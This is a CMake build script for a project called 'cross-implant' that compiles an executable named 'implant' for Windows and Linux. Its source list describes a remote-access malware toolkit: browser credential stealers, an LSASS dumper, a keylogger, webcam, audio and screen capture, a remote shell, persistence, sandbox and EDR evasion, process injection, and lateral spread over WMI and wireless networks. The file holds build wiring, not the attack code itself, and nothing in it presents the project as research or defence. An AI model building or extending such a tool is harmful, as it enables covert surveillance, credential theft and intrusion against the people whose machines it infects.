cmake_minimum_required(VERSION 3.20)
project(cross-implant LANGUAGES C CXX)

if(POLICY CMP0135)
  cmake_policy(SET CMP0135 NEW)
endif()

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

add_definitions(-DSQLITE_OMIT_FTS5)

if(WIN32)
    include(cmake/CompileOptions.cmake)
else()
    add_definitions(-DLINUX)
endif()

include(FetchContent)

if(WIN32)
    if(MSVC)
        enable_language(ASM_MASM)
        set(SYSCALL_STUB src/evasion/SyscallStub_masm.asm)
    else()
        enable_language(ASM)
        set(SYSCALL_STUB src/evasion/SyscallStub_gas.s)
    endif()
endif()

# nlohmann-json
FetchContent_Declare(
    json
    URL https://github.com/nlohmann/json/releases/download/v3.11.2/json.tar.xz
    DOWNLOAD_EXTRACT_TIMESTAMP TRUE
)
FetchContent_MakeAvailable(json)

# googletest
FetchContent_Declare(
  googletest
  URL https://github.com/google/googletest/archive/refs/heads/main.zip
  DOWNLOAD_EXTRACT_TIMESTAMP TRUE
)
if(WIN32)
    set(gtest_force_shared_crt ON CACHE BOOL "" FORCE)
endif()
FetchContent_MakeAvailable(googletest)

set(COMMON_SOURCES
    src/main.cpp
    src/utils/Logger.cpp
    src/utils/Shared.cpp
    src/utils/SelfDelete.cpp
    src/core/ImplantId.cpp
    src/crypto/AesGcm.cpp
    src/crypto/Base64.cpp
    src/http/RedirectorResolver.cpp
    src/beacon/Beacon.cpp
    src/beacon/TaskDispatcher.cpp
    src/recon/SysInfo.cpp
    src/recon/InstalledSoftware.cpp
    src/persistence/Persistence.cpp
    src/utils/Exec.cpp
    src/credential/ChromiumStealer.cpp
    src/credential/FirefoxStealer.cpp
    src/capture/Screenshot.cpp
    src/capture/Audio.cpp
    src/capture/Webcam.cpp
    src/streaming/Streamer.cpp
    src/shell/InteractiveShell.cpp
    src/fs/FileSystem.cpp
    src/recon/DeepRecon.cpp
    src/evasion/AntiSandbox.cpp
    src/evasion/Detection.cpp
    src/evasion/JunkLogic.cpp
    src/network/SocksProxy.cpp
    external/sqlite3/sqlite3.c
)

if(WIN32)
    set(PLATFORM_SOURCES
        src/http/WinHttpClient.cpp
        src/recon/WmiHelpers.cpp
        src/wifi/WifiDumper.cpp
        src/capture/Keylogger.cpp
        src/evasion/Syscalls.cpp
        ${SYSCALL_STUB}
        src/evasion/Unhooker.cpp
        src/evasion/Injector.cpp
        src/evasion/Bloat.cpp
        src/execution/DotNetExecutor.cpp
        src/persistence/ComHijacker.cpp
        src/credential/LsassDumper.cpp
        src/lateral/WmiExec.cpp
        src/lateral/WirelessSpread.cpp
        src/decoy/BSOD.cpp
    )
    add_executable(implant WIN32 ${COMMON_SOURCES} ${PLATFORM_SOURCES})
    target_link_libraries(implant
        nlohmann_json::nlohmann_json
        bcrypt winhttp advapi32 ole32 wbemuuid crypt32 shlwapi gdiplus vfw32 winmm user32 iphlpapi ws2_32 dbghelp wlanapi netapi32 bthprops psapi
    )
else()
    find_package(OpenSSL REQUIRED)
    find_package(PkgConfig REQUIRED)
    pkg_check_modules(X11 REQUIRED x11)

    set(PLATFORM_SOURCES
        src/http/HttpClient.cpp
        src/execution/InMemory.cpp
        src/wifi/WifiScanner.cpp
    )
    add_executable(implant ${COMMON_SOURCES} ${PLATFORM_SOURCES})
    target_include_directories(implant PUBLIC
        ${OPENSSL_INCLUDE_DIR}
        ${X11_INCLUDE_DIRS}
    )
    target_link_libraries(implant
        nlohmann_json::nlohmann_json
        OpenSSL::SSL
        OpenSSL::Crypto
        ${X11_LIBRARIES}
        pthread
        dl
        util
    )
endif()

target_include_directories(implant PUBLIC src external external/sqlite3)

# Tests
add_executable(unit_tests
    tests/Base64Test.cpp
    tests/AesGcmTest.cpp
    src/crypto/Base64.cpp
    src/crypto/AesGcm.cpp
)
target_include_directories(unit_tests PRIVATE src)
if(WIN32)
    target_link_libraries(unit_tests GTest::gtest_main bcrypt crypt32)
else()
    target_link_libraries(unit_tests GTest::gtest_main OpenSSL::Crypto pthread)
endif()
